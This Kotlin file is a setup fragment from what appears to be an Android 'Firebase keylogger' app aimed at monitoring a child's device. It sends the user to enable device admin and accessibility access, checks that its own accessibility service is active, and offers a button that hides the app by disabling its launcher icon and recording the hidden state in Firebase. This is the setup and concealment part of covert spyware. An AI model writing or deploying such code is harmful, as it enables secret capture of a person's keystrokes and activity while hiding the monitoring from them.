package com.sm.sdt.firebasekeyloggerandroird.ui.Fragment.child

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.provider.Settings
import android.view.*
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.sm.sdt.firebasekeyloggerandroird.Consts
import com.sm.sdt.firebasekeyloggerandroird.Consts.ACCOUNT_DATA
import com.sm.sdt.firebasekeyloggerandroird.Consts.IS_HIDDEN
import com.sm.sdt.firebasekeyloggerandroird.Consts.USER_REFRENCE
import com.sm.sdt.firebasekeyloggerandroird.Consts.firebaseAuth
import com.sm.sdt.firebasekeyloggerandroird.Consts.firebaseDatabase
import com.sm.sdt.firebasekeyloggerandroird.R
import com.sm.sdt.firebasekeyloggerandroird.databinding.FragmentChildPermissionBinding
import com.sm.sdt.firebasekeyloggerandroird.ui.MainActivity


class ChildPermissionFragment : Fragment(R.layout.fragment_child_permission) {

    var _binding: FragmentChildPermissionBinding? = null
    val binding get() = _binding!!

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentChildPermissionBinding.inflate(inflater, container, false)
        val view = binding.root
        return view
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        setHasOptionsMenu(true)

        var parentUid = ""
        if (firebaseAuth.currentUser != null) {
            parentUid = firebaseAuth.currentUser!!.uid
        }

        val sharedPreferences =
            context?.getSharedPreferences(Consts.PREFERENCE_NAME, Context.MODE_PRIVATE)
        val childName = sharedPreferences?.getString(Consts.CHILD_NAME_KEY, "")
        val userRef = firebaseDatabase.getReference(USER_REFRENCE)






        binding.deviceAdminBtn.setOnClickListener {
            startActivity(
                Intent().setComponent(
                    ComponentName(
                        "com.android.settings",
                        "com.android.settings.DeviceAdminSettings"
                    )
                )
            )
        }

        binding.opernAccessibilityBtn.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        }

        binding.hideAppBtn.setOnClickListener {
            userRef.child(parentUid).child(childName.toString()).child(
                ACCOUNT_DATA
            ).child(IS_HIDDEN)
                .setValue(1).addOnSuccessListener {

                    val pkg: PackageManager = requireActivity().getPackageManager()
                    pkg.setComponentEnabledSetting(
                        ComponentName(requireActivity(), MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP

                    )
                }
        }


    }

    override fun onResume() {
        super.onResume()
        if (checkAccessibilityPermission()) {
            binding.statusTv.text = "Accessibility Service is: ON"
            binding.statusTv.setTextColor(Color.GREEN)
            binding.hideAppBtn.isEnabled = true
        } else {
            binding.statusTv.text = "Accessibility Service is: OFF"
            binding.statusTv.setTextColor(Color.RED)

            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            binding.hideAppBtn.isEnabled = false
        }


    }


    private fun checkAccessibilityPermission(): Boolean {
        var isAccessibilityEnabled = false
        (requireActivity().getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager).apply {
            installedAccessibilityServiceList.forEach { installedService ->
                installedService.resolveInfo.serviceInfo.apply {
                    if (getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK).any {
                            it.resolveInfo.serviceInfo.packageName == packageName
                                    && it.resolveInfo.serviceInfo.name == name
                                    && permission == Manifest.permission.BIND_ACCESSIBILITY_SERVICE
                                    && it.resolveInfo.serviceInfo.packageName == requireContext().packageName
                        })
                        isAccessibilityEnabled = true
                }
            }
        }
        return isAccessibilityEnabled
    }

    override fun onCreateOptionsMenu(menu: Menu, inflater: MenuInflater) {
        inflater.inflate(R.menu.user_list_menu, menu)
        super.onCreateOptionsMenu(menu, inflater)
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.logout -> {
                firebaseAuth.signOut()
                Toast.makeText(activity, "You are logged out", Toast.LENGTH_SHORT).show()
                findNavController().navigate(ChildPermissionFragmentDirections.actionChildPermissionFragmentToParentLoginFragment())
            }
        }
        return super.onOptionsItemSelected(item)

    }
}